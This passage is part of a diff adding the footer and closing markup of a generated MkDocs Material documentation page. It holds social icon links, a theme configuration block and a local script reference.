+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
